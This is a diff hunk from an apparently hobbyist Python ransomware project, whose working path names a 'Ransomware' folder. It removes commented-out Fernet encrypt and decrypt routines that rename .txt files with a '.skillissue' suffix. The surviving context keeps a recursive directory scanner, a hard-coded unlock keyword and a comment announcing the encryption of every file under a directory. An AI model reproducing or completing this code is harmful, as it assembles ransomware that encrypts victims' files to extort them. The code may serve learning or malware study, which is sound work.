@@ -39,42 +39,9 @@ def scanRecurse(baseDir):
         elif entry.is_dir():
             yield from scanRecurse(entry.path)
 
-# def encrypt(dataFile, symmetric_key):
-#     if dataFile.name.endswith('.txt'):
-#         with open(dataFile, 'rb') as f:
-#             data = f.read()
-
-#         cipher_suite = Fernet(symmetric_key)
-#         encrypted_data = cipher_suite.encrypt(data)
-
-#         encrypted_file = dataFile.with_suffix('.txt.skillissue')
-#         with open(encrypted_file, 'wb') as f:
-#             f.write(encrypted_data)
-
-# def decrypt(dataFile, symmetric_key):
-#     if dataFile.name.endswith('.txt.skillissue'):
-#         with open(dataFile, 'rb') as f:
-#             encrypted_data = f.read()
-
-#         cipher_suite = Fernet(symmetric_key)
-#         decrypted_data = cipher_suite.decrypt(encrypted_data)
-
-#         decrypted_file = dataFile.with_suffix('')
-#         with open(decrypted_file, 'wb') as f:
-#             f.write(decrypted_data)
-
-# def scanRecurse(baseDir):
-#     for entry in os.scandir(baseDir):
-#         if entry.is_file():
-#             yield entry
-#         elif entry.is_dir():
-#             yield from scanRecurse(entry.path)
 
 def verify_keyword(keyword):
     return keyword == "ratio" 
-
-# load the symmetric key 
-# symmetric_key = load_symmetric_key()
 
 # Encrypt all files in the current directory and its subdirectories
 directory = "C:/Users/Admin/Desktop/python/Ransomware/fernet"  # Change this to the directory containing the files to be encrypted
